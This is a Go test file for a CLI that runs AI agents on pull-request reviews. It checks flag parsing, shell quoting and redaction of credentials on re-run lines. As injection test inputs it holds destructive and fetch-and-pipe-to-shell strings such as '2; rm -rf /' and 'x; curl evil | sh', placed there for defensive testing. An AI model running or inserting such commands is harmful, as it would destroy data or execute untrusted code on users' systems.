package run

import (
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/stainless-code/verdict/internal/cli"
	"github.com/stainless-code/verdict/internal/config"
	"github.com/stainless-code/verdict/internal/core"
	"github.com/stainless-code/verdict/internal/readcommon"
)

func readFile(t *testing.T, path string) []byte {
	t.Helper()
	raw, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	return raw
}

// testRunner builds the run verb's runner around buffers the caller can
// inspect. A test that drives another verb, or JSON mode, adjusts the runner.
func testRunner() (*cli.Runner, *strings.Builder, *strings.Builder) {
	var out, diag strings.Builder
	r := &cli.Runner{
		Cmd: "run", Repo: "acme/app", Pr: "42",
		Out: &out, Diag: &diag, Human: &out,
		Now: time.Now, Effective: cli.Defaults(), EnvNoColor: true,
	}
	return r, &out, &diag
}

// TestRenderCommandQuotesForShell pins the --print rendering: safe arguments
// stay bare, everything else is single-quoted, and an embedded single quote
// is closed, escaped, and reopened so the line stays copy-pasteable.
func TestRenderCommandQuotesForShell(t *testing.T) {
	tests := []struct {
		name string
		want string
		argv []string
	}{
		{
			name: "flags and paths stay bare",
			argv: []string{"claude", "-p", "--model", "opus", ".verdict/state/42/review.json"},
			want: "claude -p --model opus .verdict/state/42/review.json",
		},
		{
			name: "spaces and newlines are quoted",
			argv: []string{"claude", "-p", "Review acme/app PR 42\nand write one file."},
			want: "claude -p 'Review acme/app PR 42\nand write one file.'",
		},
		{
			name: "an embedded single quote is escaped",
			argv: []string{"echo", "it's fine"},
			want: `echo 'it'\''s fine'`,
		},
		{
			name: "an empty argument stays an argument",
			argv: []string{"claude", "-p", ""},
			want: "claude -p ''",
		},
		{
			name: "shell metacharacters are quoted",
			argv: []string{"agent", "$HOME;rm -rf *"},
			want: "agent '$HOME;rm -rf *'",
		},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			if got := RenderCommand(tc.argv); got != tc.want {
				t.Fatalf("RenderCommand = %q, want %q", got, tc.want)
			}
		})
	}
}

// TestParseFlagsPassThrough proves everything after a bare `--` reaches the
// agent unchanged, including tokens the verb would otherwise own.
func TestParseFlagsPassThrough(t *testing.T) {
	r, _, _ := testRunner()
	flags, code, done := parseFlags(r, []string{
		"--agent", "claude", "--timeout", "42", "--print",
		"--", "--json", "--agent", "not-ours", "--", "trailing",
	})
	if done {
		t.Fatalf("parse failed with exit %d", code)
	}
	if flags.agent != "claude" || flags.timeout != "42" || !flags.print {
		t.Fatalf("flags = agent %q timeout %q print %v", flags.agent, flags.timeout, flags.print)
	}
	want := []string{"--json", "--agent", "not-ours", "--", "trailing"}
	if !slices.Equal(flags.pass, want) {
		t.Fatalf("pass-through = %q, want %q", flags.pass, want)
	}
}

// TestParseFlagsDefaults proves the absent --timeout keeps verify's default and
// that a bare `--` with nothing after it is no pass-through at all.
func TestParseFlagsDefaults(t *testing.T) {
	r, _, _ := testRunner()
	flags, code, done := parseFlags(r, []string{"--agent", "codex", "--"})
	if done {
		t.Fatalf("parse failed with exit %d", code)
	}
	if flags.agent != "codex" || flags.timeout != "300" || flags.print || len(flags.pass) != 0 {
		t.Fatalf("flags = %+v", flags)
	}
}

// TestParseFlagsUnknownFlagIsUsage proves an unknown pre-`--` token is a usage
// error (exit 2) naming the accepted surface, never a passthrough.
func TestParseFlagsUnknownFlagIsUsage(t *testing.T) {
	r, out, diag := testRunner()
	_, code, done := parseFlags(r, []string{"--agent", "claude", "--model", "opus"})
	if !done || code != cli.ExitUsage {
		t.Fatalf("exit = %d done %v, want the usage exit", code, done)
	}
	if out.Len() != 0 {
		t.Errorf("usage error wrote %q to stdout; want the diagnostic stream only", out.String())
	}
	if !strings.Contains(diag.String(), "--agent <name>") {
		t.Errorf("usage error does not name the accepted flags: %q", diag.String())
	}
}

// TestParseFlagsMissingValueIsUsage proves a value flag without its operand
// is a usage error rather than an empty agent name.
func TestParseFlagsMissingValueIsUsage(t *testing.T) {
	r, _, diag := testRunner()
	_, code, done := parseFlags(r, []string{"--agent"})
	if !done || code != cli.ExitUsage {
		t.Fatalf("exit = %d done %v, want the usage exit", code, done)
	}
	if !strings.Contains(diag.String(), "--agent") {
		t.Errorf("usage error does not name the flag: %q", diag.String())
	}
}

// TestParseFlagsRounds proves --rounds is parsed, defaults to the one-shot,
// and never leaks into the pass-through tail.
func TestParseFlagsRounds(t *testing.T) {
	r, _, _ := testRunner()
	flags, code, done := parseFlags(r, []string{"--agent", "claude"})
	if done {
		t.Fatalf("parse failed with exit %d", code)
	}
	if flags.rounds != "2" {
		t.Fatalf("rounds = %q, want the two-round default", flags.rounds)
	}
	flags, code, done = parseFlags(r, []string{"--agent", "claude", "--rounds", "3", "--", "--rounds", "9"})
	if done {
		t.Fatalf("parse failed with exit %d", code)
	}
	if flags.rounds != "3" {
		t.Fatalf("rounds = %q, want 3", flags.rounds)
	}
	want := []string{"--rounds", "9"}
	if !slices.Equal(flags.pass, want) {
		t.Fatalf("pass-through = %q, want %q", flags.pass, want)
	}
}

// TestParseFlagsRoundsMissingValue proves a --rounds without its operand is a
// usage error, never a silent default: the operator must name the count.
func TestParseFlagsRoundsMissingValue(t *testing.T) {
	r, _, diag := testRunner()
	_, code, done := parseFlags(r, []string{"--agent", "claude", "--rounds"})
	if !done || code != cli.ExitUsage {
		t.Fatalf("exit = %d done %v, want the usage exit", code, done)
	}
	if !strings.Contains(diag.String(), "--rounds") {
		t.Errorf("usage error does not name the flag: %q", diag.String())
	}
}

// TestRentryKeepsRounds pins the re-run line: the round count it names is
// the one the operator ran, dropped only at the default.
func TestRentryKeepsRounds(t *testing.T) {
	req := testReq()
	got := rentry(req, &flags{agent: "claude", timeout: DefaultTimeoutS, rounds: "3"}, false)
	want := "verdict run acme/app 42 --agent claude --rounds 3"
	if got != want {
		t.Fatalf("rentry = %q, want %q", got, want)
	}
	if plain := rentry(req, &flags{agent: "claude", timeout: DefaultTimeoutS, rounds: DefaultRounds}, false); plain != "verdict run acme/app 42 --agent claude" {
		t.Fatalf("rentry default = %q", plain)
	}
}

// TestRentryRebuildsTheCommand pins the re-run line: the identity it names
// is the one the operator ran, minus the unquotable pass-through tail.
func TestRentryRebuildsTheCommand(t *testing.T) {
	req := testReq()
	got := rentry(req, &flags{agent: "claude", timeout: "42", print: true}, true)
	want := "verdict run acme/app 42 --agent claude --timeout 42 --print --json"
	if got != want {
		t.Fatalf("rentry = %q, want %q", got, want)
	}
	if plain := rentry(req, &flags{agent: "claude", timeout: DefaultTimeoutS}, false); plain != "verdict run acme/app 42 --agent claude" {
		t.Fatalf("rentry default = %q", plain)
	}
}

// TestParseFlagsRecipe proves --recipe takes its operand as a value flag,
// leaves the resolution to the service when absent, and never eats a
// pass-through tail.
func TestParseFlagsRecipe(t *testing.T) {
	r, _, _ := testRunner()
	flags, code, done := parseFlags(r, []string{"--agent", "claude"})
	if done {
		t.Fatalf("parse failed with exit %d", code)
	}
	if flags.recipe != "" {
		t.Fatalf("recipe = %q, want the empty name that resolves default", flags.recipe)
	}
	flags, code, done = parseFlags(r, []string{"--agent", "claude", "--recipe", "quick", "--", "--recipe", "9"})
	if done {
		t.Fatalf("parse failed with exit %d", code)
	}
	if flags.recipe != "quick" {
		t.Fatalf("recipe = %q, want quick", flags.recipe)
	}
	want := []string{"--recipe", "9"}
	if !slices.Equal(flags.pass, want) {
		t.Fatalf("pass-through = %q, want %q", flags.pass, want)
	}
	if got := runRequest(r, testReq(), &flags).Recipe; got != "quick" {
		t.Errorf("request recipe = %q, want the parsed flag carried through", got)
	}
}

// TestParseFlagsRecipeMissingValue proves --recipe without its operand is a
// usage error naming the flag, never a silent default.
func TestParseFlagsRecipeMissingValue(t *testing.T) {
	r, _, diag := testRunner()
	_, code, done := parseFlags(r, []string{"--agent", "claude", "--recipe"})
	if !done || code != cli.ExitUsage {
		t.Fatalf("exit = %d done %v, want the usage exit", code, done)
	}
	if got, want := strings.TrimSpace(diag.String()), "--recipe needs a value (want <slug>)"; got != want {
		t.Errorf("usage error = %q, want %q", got, want)
	}
}

// TestUnknownFlagNamesRecipe proves the unknown-flag diagnostic advertises
// --recipe: the parse error is where an operator learns the surface grew.
func TestUnknownFlagNamesRecipe(t *testing.T) {
	r, _, diag := testRunner()
	_, code, done := parseFlags(r, []string{"--agent", "claude", "--recipe-file", "x.json"})
	if !done || code != cli.ExitUsage {
		t.Fatalf("exit = %d done %v, want the usage exit", code, done)
	}
	if !strings.Contains(diag.String(), "--recipe <slug>") {
		t.Errorf("unknown-flag diagnostic does not name --recipe: %q", diag.String())
	}
}

// TestRentryKeepsRecipe pins the re-run line: the pipeline it names is the one
// the operator asked for, dropped only when unasked.
func TestRentryKeepsRecipe(t *testing.T) {
	req := testReq()
	got := rentry(req, &flags{agent: "claude", timeout: DefaultTimeoutS, rounds: DefaultRounds, recipe: "quick"}, false)
	want := "verdict run acme/app 42 --agent claude --recipe quick"
	if got != want {
		t.Fatalf("rentry = %q, want %q", got, want)
	}
	if plain := rentry(req, &flags{agent: "claude", timeout: DefaultTimeoutS, rounds: DefaultRounds}, false); strings.Contains(plain, "--recipe") {
		t.Fatalf("rentry named a recipe nobody asked for: %q", plain)
	}
}

// TestParseFlagsStage proves --stage takes its operand as a value flag, keeps
// it raw for the service to resolve against the plan, and never eats a
// pass-through tail.
func TestParseFlagsStage(t *testing.T) {
	r, _, _ := testRunner()
	flags, code, done := parseFlags(r, []string{"--agent", "claude", "--print", "--stage", "2", "--", "--stage", "9"})
	if done {
		t.Fatalf("parse failed with exit %d", code)
	}
	if flags.stage != "2" || !flags.print {
		t.Fatalf("flags = stage %q print %v", flags.stage, flags.print)
	}
	if want := []string{"--stage", "9"}; !slices.Equal(flags.pass, want) {
		t.Fatalf("pass-through = %q, want %q", flags.pass, want)
	}
	if got := runRequest(r, testReq(), &flags).StageRaw; got != "2" {
		t.Errorf("request stage = %q, want the parsed flag carried through", got)
	}
}

// TestParseFlagsStageMissingValue proves --stage without its operand is a usage
// error naming the flag, never a silent whole-pipeline render.
func TestParseFlagsStageMissingValue(t *testing.T) {
	r, _, diag := testRunner()
	_, code, done := parseFlags(r, []string{"--agent", "claude", "--print", "--stage"})
	if !done || code != cli.ExitUsage {
		t.Fatalf("exit = %d done %v, want the usage exit", code, done)
	}
	if got, want := strings.TrimSpace(diag.String()), "--stage needs a value (want <n>)"; got != want {
		t.Errorf("usage error = %q, want %q", got, want)
	}
}

// TestParseFlagsStageEmptyValue proves --stage with an empty operand is the
// same usage error as --stage with none: the service reads "" as "render the
// whole pipeline", which is the one command the flag exists to avoid.
func TestParseFlagsStageEmptyValue(t *testing.T) {
	r, _, diag := testRunner()
	_, code, done := parseFlags(r, []string{"--agent", "claude", "--print", "--stage", ""})
	if !done || code != cli.ExitUsage {
		t.Fatalf("exit = %d done %v, want the usage exit", code, done)
	}
	if got, want := strings.TrimSpace(diag.String()), "--stage needs a value (want <n>)"; got != want {
		t.Errorf("usage error = %q, want %q", got, want)
	}
}

// TestRentryQuotesTheStageOperand pins the paste-safe form: the operand reaches
// this line as the operator typed it, refusals included, so a value carrying
// shell metacharacters must not rewrite the command it is echoed in.
func TestRentryQuotesTheStageOperand(t *testing.T) {
	req := testReq()
	got := rentry(req, &flags{agent: "claude", stage: "2; rm -rf /", timeout: DefaultTimeoutS, rounds: DefaultRounds, print: true}, false)
	want := "verdict run acme/app 42 --agent claude --print --stage '2; rm -rf /'"
	if got != want {
		t.Fatalf("rentry = %q, want %q", got, want)
	}
}

// TestUnknownFlagNamesStage proves the unknown-flag diagnostic advertises
// --stage: the parse error is where an operator learns the surface grew.
func TestUnknownFlagNamesStage(t *testing.T) {
	r, _, diag := testRunner()
	_, code, done := parseFlags(r, []string{"--agent", "claude", "--stages", "2"})
	if !done || code != cli.ExitUsage {
		t.Fatalf("exit = %d done %v, want the usage exit", code, done)
	}
	if !strings.Contains(diag.String(), "--stage <n>") {
		t.Errorf("unknown-flag diagnostic does not name --stage: %q", diag.String())
	}
}

// TestRentryKeepsStage pins the re-run line: the stage it names is the one the
// operator rendered, dropped only when unasked.
func TestRentryKeepsStage(t *testing.T) {
	req := testReq()
	got := rentry(req, &flags{agent: "claude", recipe: "quick", stage: "2", timeout: DefaultTimeoutS, rounds: DefaultRounds, print: true}, false)
	want := "verdict run acme/app 42 --agent claude --recipe quick --print --stage 2"
	if got != want {
		t.Fatalf("rentry = %q, want %q", got, want)
	}
	plain := rentry(req, &flags{agent: "claude", timeout: DefaultTimeoutS, rounds: DefaultRounds}, false)
	if strings.Contains(plain, "--stage") {
		t.Fatalf("rentry named a stage nobody asked for: %q", plain)
	}
}

// TestPersonalAgentsReadsPrefsOnly pins the adapter's source: definitions come
// from the XDG/HOME settings file, and a repository config carrying the same
// key cannot define one.
func TestPersonalAgentsReadsPrefsOnly(t *testing.T) {
	xdg := t.TempDir()
	settings := filepath.Join(xdg, "verdict", "settings.json")
	if err := os.MkdirAll(filepath.Dir(settings), 0o700); err != nil {
		t.Fatal(err)
	}
	doc := `{"agents":{"local":{"binary":"local-agent","args":["exec"],"prompt_flag":"-p"}}}`
	if err := os.WriteFile(settings, []byte(doc), 0o600); err != nil {
		t.Fatal(err)
	}
	defs, _, ref := personalAgents(map[string]string{"XDG_CONFIG_HOME": xdg})
	if ref != nil {
		t.Fatalf("personalAgents: %v", ref)
	}
	assertSinglePrefsAgent(t, defs)
	repo := filepath.Join(t.TempDir(), "config.json")
	if err := os.WriteFile(repo, []byte(`{"schema_version":"1","agents":{"local":{"binary":"local"}}}`), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, ref := config.Parse(readFile(t, repo)); ref == nil || ref.Code != config.CodeBadConfig {
		t.Fatalf("repo config with agents = %v, want bad-config", ref)
	}
}

func assertSinglePrefsAgent(t *testing.T, defs []config.PersonalAgent) {
	t.Helper()
	if len(defs) != 1 || defs[0].Name != "local" || defs[0].Binary != "local-agent" ||
		!slices.Equal(defs[0].Args, []string{"exec"}) || defs[0].PromptFlag != "-p" {
		t.Fatalf("definitions = %+v, want the prefs row", defs)
	}
}

// TestReentryKeepsAgentArguments pins that the re-entry line carries the
// arguments after `--` after --json with their shape: every flag name stays,
// every value — model and budget values included — is redacted, and the line
// says to re-supply them.
func TestReentryKeepsAgentArguments(t *testing.T) {
	r, _, _ := testRunner()
	parsed, _, done := parseFlags(r, []string{
		"--agent", "claude", "--resume", "--",
		"--model", "opus", "--max-turns=12", "-p", "--permission-mode", "acceptEdits", "-mopus",
	})
	if done {
		t.Fatalf("parsed=%+v", parsed)
	}
	want := `verdict run acme/app 42 --resume --agent claude --json -- --model '***REDACTED***' ` +
		`'--max-turns=***REDACTED***' -p --permission-mode '***REDACTED***' '***REDACTED***'` +
		`  # replace each '***REDACTED***' with the agent argument you passed`
	if got := reentry(testReq(), &parsed, true, parsed.resume, nil); got != want {
		t.Fatalf("re-entry = %s\nwant       %s", got, want)
	}
}

// TestReentryNeverPrintsCredentials proves no credential an agent argument
// carries reaches the re-entry line, whatever flag carries it: a bearer header
// and a cookie, which no secret-named flag announces, an opaque value and a
// long-tailed key passed as the model, and a token shape the display would
// once have shown.
func TestReentryNeverPrintsCredentials(t *testing.T) {
	t.Parallel()
	const opaque = "opaque-session-9f8e7d6c5b4a"
	const tail = "Zq81x7Yw2Vt9Ur4Sp6On3Ml5Kj0Ih8Gf"
	for name, tc := range map[string]struct {
		secret string
		pass   []string
	}{
		"bearer header": {opaque, []string{"--header", "Authorization: Bearer " + opaque}},
		"cookie":        {opaque, []string{"--cookie", "sid=" + opaque}},
		"opaque model":  {opaque, []string{"--model", opaque}},
		"sk-proj model": {tail, []string{"-m", "sk-proj-" + tail}},
		"inline model":  {tail, []string{"--model=sk-proj-" + tail}},
	} {
		f := &flags{agent: "claude", timeout: DefaultTimeoutS, rounds: DefaultRounds, pass: tc.pass}
		got := reentry(testReq(), f, false, false, nil)
		if strings.Contains(got, tc.secret) || !strings.HasPrefix(got, "verdict run acme/app 42 --agent claude -- ") ||
			!strings.HasSuffix(got, redactedNote) {
			t.Errorf("%s: re-entry = %s, want the credential redacted and the note", name, got)
		}
	}
}

// TestReentryNotesEveryRedaction proves the re-supply note follows any
// redaction the line carries, not only the agent arguments': an operand the
// environment scrub redacted asks for its value back too.
func TestReentryNotesEveryRedaction(t *testing.T) {
	t.Parallel()
	f := &flags{agent: "claude", recipe: "supersecretvalue1", timeout: DefaultTimeoutS, rounds: DefaultRounds}
	got := reentry(testReq(), f, false, false, []string{"ANTHROPIC_API_KEY=supersecretvalue1"})
	want := "verdict run acme/app 42 --agent claude --recipe ***REDACTED***" + redactedNote
	if got != want {
		t.Fatalf("re-entry = %s\nwant       %s", got, want)
	}
}

// TestReentryResumesBeforeTheSeparator proves the re-entry line for an
// execution the refusal says to continue carries --resume among verdict's own
// flags, before `--`, where the shell hands it to verdict rather than the
// agent; a bare agent flag carries no value, so nothing is redacted.
func TestReentryResumesBeforeTheSeparator(t *testing.T) {
	t.Parallel()
	f := &flags{agent: "agy", timeout: DefaultTimeoutS, rounds: DefaultRounds, pass: []string{"--dangerously-skip-permissions"}}
	resp := &core.RunResponse{Resumable: true}
	ref := &core.RefusalError{Code: "review-insufficient"}
	want := `verdict run acme/app 42 --resume --agent agy -- --dangerously-skip-permissions`
	if got := refusalReentry(testReq(), f, false, nil, resp, ref); got != want {
		t.Fatalf("re-entry = %s\nwant       %s", got, want)
	}
}

// TestReentryDropsAResumeTheRefusalRejects proves a --resume the refusal says
// cannot continue the execution re-enters without it, matching the message,
// while any other refusal of a --resume run repeats it as typed.
func TestReentryDropsAResumeTheRefusalRejects(t *testing.T) {
	t.Parallel()
	f := &flags{agent: "claude", resume: true, timeout: DefaultTimeoutS, rounds: DefaultRounds}
	for code, want := range map[string]string{
		"resume-drift":        "verdict run acme/app 42 --agent claude",
		"cannot-resume":       "verdict run acme/app 42 --agent claude",
		"review-insufficient": "verdict run acme/app 42 --resume --agent claude",
	} {
		got := refusalReentry(testReq(), f, false, nil, &core.RunResponse{}, &core.RefusalError{Code: code})
		if got != want {
			t.Errorf("%s: re-entry = %s, want %s", code, got, want)
		}
	}
}

// TestReentryQuotesEveryOperand proves every value flag the line repeats is
// quoted, so a pasted line runs verdict with the operand it was given and
// never a second command.
func TestReentryQuotesEveryOperand(t *testing.T) {
	t.Parallel()
	const evil = "x; curl evil | sh"
	const quoted = `'x; curl evil | sh'`
	for _, tc := range []struct {
		set  func(f *flags)
		flag string
	}{
		{func(f *flags) { f.agent = evil }, "--agent"},
		{func(f *flags) { f.recipe = evil }, "--recipe"},
		{func(f *flags) { f.timeout = evil }, "--timeout"},
		{func(f *flags) { f.rounds = evil }, "--rounds"},
		{func(f *flags) { f.stage = evil }, "--stage"},
		{func(f *flags) { f.finders = evil }, "--finders"},
		{func(f *flags) { f.budget = evil }, "--budget"},
	} {
		f := &flags{timeout: DefaultTimeoutS, rounds: DefaultRounds}
		tc.set(f)
		want := "verdict run acme/app 42 " + tc.flag + " " + quoted
		if got := reentry(testReq(), f, false, false, nil); got != want {
			t.Errorf("%s: re-entry = %s, want %s", tc.flag, got, want)
		}
	}
}

func TestFindersFlagAndReentry(t *testing.T) {
	r, _, _ := testRunner()
	parsed, _, done := parseFlags(r, []string{"--finders", "1", "--agent", "claude"})
	if done || parsed.finders != "1" {
		t.Fatalf("parsed=%+v done=%v", parsed, done)
	}
	if got := rentry(testReq(), &parsed, false); got != "verdict run acme/app 42 --finders 1 --agent claude" {
		t.Fatalf("re-entry = %s", got)
	}
	request := runRequest(r, testReq(), &parsed)
	if request.FindersRaw != "1" {
		t.Fatalf("request finders = %q", request.FindersRaw)
	}
}

// TestBudgetFlagAndReentry pins the --budget surface: the flag reaches the
// service, the re-entry line carries it beside --finders, and an unknown depth
// is a usage refusal (exit 2) before any bundle is read.
func TestBudgetFlagAndReentry(t *testing.T) {
	r, _, _ := testRunner()
	parsed, code, done := parseFlags(r, []string{"--budget", "auto", "--finders", "2", "--agent", "claude"})
	if done || code != 0 || parsed.budget != "auto" || parsed.finders != "2" {
		t.Fatalf("parsed=%+v code=%d done=%v", parsed, code, done)
	}
	want := "verdict run acme/app 42 --finders 2 --budget auto --agent claude"
	if got := rentry(testReq(), &parsed, false); got != want {
		t.Fatalf("re-entry = %s; want %s", got, want)
	}
	request := runRequest(r, testReq(), &parsed)
	if request.BudgetRaw != "auto" {
		t.Fatalf("request budget = %q", request.BudgetRaw)
	}

	for _, raw := range []string{"fast", "cheap", "Auto", ""} {
		t.Run(raw, func(t *testing.T) { assertBudgetUsageRefusal(t, raw) })
	}
}

// assertBudgetUsageRefusal grades one rejected depth: the parse ends the
// invocation with the usage exit code instead of reaching the service.
func assertBudgetUsageRefusal(t *testing.T, raw string) {
	t.Helper()
	runner, _, _ := testRunner()
	_, code, done := parseFlags(runner, []string{"--budget", raw})
	if !done || code != cli.ExitUsage {
		t.Fatalf("budget %q: done=%v code=%d", raw, done, code)
	}
}

// TestResumeFlagAndReentry pins the --resume surface: a bare boolean flag that
// reaches the service, appears in the re-entry line only when typed, and never
// swallows the following argument.
// TestAllowShellFlagAndReentry proves --allow-shell is parsed, carried into the
// service request, and rendered back by the re-entry line only when the
// invocation asked for it.
func TestAllowShellFlagAndReentry(t *testing.T) {
	r, _, _ := testRunner()
	parsed, code, done := parseFlags(r, []string{"--allow-shell", "--agent", "claude"})
	if done || code != 0 || !parsed.allowShell || parsed.agent != "claude" {
		t.Fatalf("parsed=%+v code=%d done=%v", parsed, code, done)
	}
	want := "verdict run acme/app 42 --allow-shell --agent claude"
	if got := rentry(testReq(), &parsed, false); got != want {
		t.Fatalf("re-entry = %s; want %s", got, want)
	}
	if request := runRequest(r, testReq(), &parsed); !request.AllowShell {
		t.Fatal("run request did not carry --allow-shell")
	}

	plain, _, _ := parseFlags(r, []string{"--agent", "claude"})
	if plain.allowShell {
		t.Fatal("a run without --allow-shell allowed the agent's shell")
	}
	if got := rentry(testReq(), &plain, false); got != "verdict run acme/app 42 --agent claude" {
		t.Fatalf("re-entry = %s", got)
	}
	if request := runRequest(r, testReq(), &plain); request.AllowShell {
		t.Fatal("run request allowed the agent's shell without the flag")
	}
}

func TestResumeFlagAndReentry(t *testing.T) {
	r, _, _ := testRunner()
	parsed, code, done := parseFlags(r, []string{"--resume", "--agent", "claude"})
	if done || code != 0 || !parsed.resume || parsed.agent != "claude" {
		t.Fatalf("parsed=%+v code=%d done=%v", parsed, code, done)
	}
	want := "verdict run acme/app 42 --resume --agent claude"
	if got := rentry(testReq(), &parsed, false); got != want {
		t.Fatalf("re-entry = %s; want %s", got, want)
	}
	if request := runRequest(r, testReq(), &parsed); !request.Resume {
		t.Fatal("run request did not carry --resume")
	}

	plain, _, _ := parseFlags(r, []string{"--agent", "claude"})
	if plain.resume {
		t.Fatal("a run without --resume set the resume request")
	}
	if got := rentry(testReq(), &plain, false); got != "verdict run acme/app 42 --agent claude" {
		t.Fatalf("re-entry = %s", got)
	}
}

// TestRefuseExitsWithTheAgentStatusOnlyForAgentFailed pins the exit table: a
// response may carry an agent's status for any refusal (a sibling phase's), but
// only agent-failed passes it through as the process exit.
func TestRefuseExitsWithTheAgentStatusOnlyForAgentFailed(t *testing.T) {
	for code, want := range map[string]int{
		"agent-failed":        7,
		"review-insufficient": cli.ExitRefused,
		"no-review-artifact":  cli.ExitRefused,
	} {
		r, _, _ := testRunner()
		got := refuse(r, &core.RunResponse{Exit: 7}, &core.RefusalError{Code: code, Message: "m"})
		if got != want {
			t.Errorf("refuse(%s) exit = %d, want %d", code, got, want)
		}
	}
}

// testReq is the acme/app PR 42 invocation with an empty runtime, the shape
// the front door hands every verb.
func testReq() *readcommon.Request {
	return &readcommon.Request{Runtime: &core.Runtime{}, Repo: "acme/app", Pr: "42"}
}
